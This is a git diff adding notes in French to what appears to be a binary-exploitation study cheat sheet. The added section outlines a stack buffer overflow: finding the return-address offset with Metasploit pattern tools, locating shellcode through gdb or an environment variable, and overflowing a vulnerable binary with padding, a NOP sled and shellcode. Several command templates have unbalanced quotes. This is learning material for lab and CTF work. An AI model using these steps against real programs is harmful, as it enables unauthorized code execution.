@@ -203,6 +203,8 @@ echo 'core' | sudo tee /proc/sys/kernel/core_pattern
 
 ### Shellcodes
 
+- https://blog.devgenius.io/understanding-the-stack-a-precursor-to-exploiting-buffer-overflow-8c6972fdb4ac
+
 #### Principe
 
 - https://www.root-me.org/fr/Documentation/Applicatif/Shellcode-introduction
@@ -216,6 +218,26 @@ objcopy -O binary -K shellcode shellcode.o shellcode.bin
 ```
 
 [ret2shellcode](./shellcode)
+
+#### Technique plus simples (pas de calcul pour les NOP)
+
+![frames](./stack_frames.png)
+
+- *Find Offset (eip = return address)* (`msf-pattern_create -t 100` puis `msf-pattern_offset -q <contenu eip>`)
+
+- *Find Shellcode Address*
+	- *using previous esp (procedure n-1) in gdb* : `b *main; r $(python -c 'print('A'*<offset_eip>); print $esp`
+	- *using environment*: `export LOGNAME = $(python -c "print('\x90'*100 + <shellcode>")` and use [./getenv LOGNAME](./getenv.c)
+
+- Go to shell-storm 
+
+- Exploit
+
+```bash
+./vuln $(python -c "print('A'*<offset_eip> + <addresse previous esp> + '\x90'*100 + <shellcode>
+# OR
+./vuln $(python -c "print('A'*<offset_eip> + <environment_address_var>)"
+```
 
 #### Outils
 
